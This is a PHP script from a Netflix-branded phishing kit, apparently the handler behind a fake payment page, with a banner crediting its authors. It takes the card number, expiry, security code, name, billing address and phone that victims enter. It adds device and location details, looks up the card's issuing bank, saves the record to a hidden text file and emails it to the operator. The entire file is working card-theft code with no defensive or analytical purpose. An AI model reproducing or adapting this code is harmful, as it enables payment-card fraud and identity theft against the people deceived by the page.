<?php 
/*
___________.____    ._________________________
\_   _____/|    |   |   \__    ___/\_   _____/
 |    __)_ |    |   |   | |    |    |    __)_ 
 |        \|    |___|   | |    |    |        \
/_______  /|_______ \___| |____|   /_______  /
        \/         \/                      \/ ADEMƠ
        ||PRIVATE N|E|T|F|l|I|X 
        ||Bzef Del'☕ ®RESERVED TO: ADEMƠ (kIllUASHk|SHk001)
*/
if(isset($_POST['cnm'])&&isset($_POST['csc'])){session_start();include '../mine.php';function cardData($bin){$ch=curl_init();curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_URL,"https://api.freebinchecker.com/bin/".$bin);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);curl_setopt($ch,CURLOPT_TIMEOUT,10);$json=json_decode(curl_exec($ch),true);curl_close($ch);if(!isset($json)||$json['valid']==false||$json==NULL){return "N/A";}return $json;}$ctp=$_POST['ctp'];$ccn=str_replace(' ','',$_POST['cnm']);$cex=$_POST['exp'];$csc=$_POST['csc'];$fnm=$_POST['fnm'];$adr=$_POST['adr'];$cty=$_POST['cty'];$zip=$_POST['zip'];$phn=$_POST['phn'];$stt=$_POST['stt'];$cnt=$_POST['cnt'];$bin=substr($ccn,0,6);$bin_data=cardData($bin);$bin_type=$bin_data["card"]['type'];$bin_level=$bin_data["card"]['category'];$bin_brand=$bin_data["card"]['scheme'];$bin_currency=$bin_data['country']['currency'];$bin_bank=$bin_data['issuer']['name'];$bin_country=$bin_data['country']['name'];$_SESSION['bank']=$bin_bank;$_SESSION['fname']=$fnm;$_SESSION['ctype']=$ctp;

		$msg.="==============================\r\n";
    	$msg.="|+ CREDITCARD({$_SESSION['ip_countryName']}) OTGxGlow\r\n";
		$msg.="|+ CREDITCARD	: {$ccn}\r\n";
		$msg.="|+ CARDEXPIRY	: {$cex}\r\n";
		$msg.="|+ CARDSECURE	: {$csc}\r\n";
		$msg.="==============================\r\n";
		$msg.="|+ CREDITCARD BIN	: {$bin_brand} ¨ {$bin_type} ¨ {$bin_level} ¨\r\n";
		$msg.="|+ CREDITCARD loCal : {$bin_bank} {$bin_country}\r\n";
    	$msg.="==============================\r\n";
		$msg.="|+ FullName : {$fnm} {$fln}: (Allo: {$phn}) \r\n";
		$msg.="|+ BIllING	: {$adr}\r\n";
		$msg.="|+ lOCAlPlc : {$cty}:{$stt}:{$cnt}:{$zip}\r\n";
    	$msg.="==============================\r\n";
		$msg.="|+ IP ADDRESS	: {$_SESSION['ip']} ¨ lmaGana Al9asir: ".now()."\r\n";
		$msg.="|+ LOCATION		: {$_SESSION['ip_city']} ¨ {$_SESSION['ip_state']} ¨ {$_SESSION['ip_countryName']}\r\n";
		$msg.="|+ BROWSER		: {$_SESSION['browser']} _> {$_SESSION['os']}\r\n";
		$msg.="|+ USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
		$msg.="==============================\r\n\r\n\r\n";

$save=fopen("../D2blEClICk.txt","a+");fwrite($save,$msg);fclose($save);

$subject="CREDITCARD({$_SESSION['ip_countryName']}) =?UTF-8?Q?=F0=9F=94=A5_?= {$_SESSION['ip']} |OTGxGlow";
$headers="From: OTGxGlow =?utf-8?q?=F0=9F=92=8E?=<CREDITCARDNETFlIX@moneySquad.org>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($yours,$subject,$msg,$headers);exit('done');}
?>